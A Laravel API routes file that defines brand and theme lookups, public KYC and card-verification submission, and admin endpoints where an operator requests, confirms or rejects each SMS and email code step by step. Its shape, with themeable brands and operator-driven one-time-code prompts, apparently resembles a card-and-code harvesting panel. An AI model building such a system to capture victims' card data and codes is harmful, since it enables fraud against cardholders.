<?php

use App\Http\Controllers\Api\KycController;
use App\Http\Controllers\Api\OrderController;
use App\Http\Controllers\Api\BrandController;
use App\Http\Controllers\Api\CardVerificationController;
use App\Http\Middleware\EnsureIsAdmin;
use App\Http\Middleware\LogApiRequests;
use App\Http\Middleware\SecurityHeaders;
use Illuminate\Support\Facades\Route;

// Global middleware
Route::middleware([SecurityHeaders::class, LogApiRequests::class])->group(function () {
    // Public routes
    Route::get('/brands', [BrandController::class, 'index']);
    Route::get('/brands/{slug}', [BrandController::class, 'show']);
    Route::get('/brands/{slug}/theme', [BrandController::class, 'theme']);

    // KYC submission (public - no auth required for submission)
    Route::post('/kyc', [KycController::class, 'store']);
    Route::get('/kyc/{uuid}/status', [KycController::class, 'show']);

    // Card Verification — Public (client-facing, uses session_token)
    Route::prefix('card-verification')->group(function () {
        Route::post('/', [CardVerificationController::class, 'store']);
        Route::get('/{sessionToken}/status', [CardVerificationController::class, 'status']);
        Route::post('/{sessionToken}/sms-code', [CardVerificationController::class, 'submitSmsCode']);
        Route::post('/{sessionToken}/email-code', [CardVerificationController::class, 'submitEmailCode']);
    });

    // Authenticated routes
    Route::middleware(['auth:sanctum', EnsureIsAdmin::class])->group(function () {
        // KYC Management
        Route::get('/kyc', [KycController::class, 'index']);
        Route::put('/kyc/{uuid}/status', [KycController::class, 'updateStatus']);
        Route::get('/kyc/stats', [KycController::class, 'stats']);

        // Orders
        Route::get('/orders', [OrderController::class, 'index']);
        Route::post('/orders', [OrderController::class, 'store']);
        Route::get('/orders/{uuid}', [OrderController::class, 'show']);
        Route::put('/orders/{uuid}/status', [OrderController::class, 'updateStatus']);

        // Card Verification — Admin actions
        Route::prefix('card-verification/admin')->group(function () {
            Route::post('/{uuid}/request-sms', [CardVerificationController::class, 'adminRequestSms']);
            Route::post('/{uuid}/confirm-sms', [CardVerificationController::class, 'adminConfirmSms']);
            Route::post('/{uuid}/reject-sms', [CardVerificationController::class, 'adminRejectSms']);
            Route::post('/{uuid}/request-email', [CardVerificationController::class, 'adminRequestEmail']);
            Route::post('/{uuid}/confirm-email', [CardVerificationController::class, 'adminConfirmEmail']);
            Route::post('/{uuid}/reject-email', [CardVerificationController::class, 'adminRejectEmail']);
            Route::post('/{uuid}/verify', [CardVerificationController::class, 'adminVerify']);
            Route::post('/{uuid}/fail', [CardVerificationController::class, 'adminFail']);
        });
    });
});
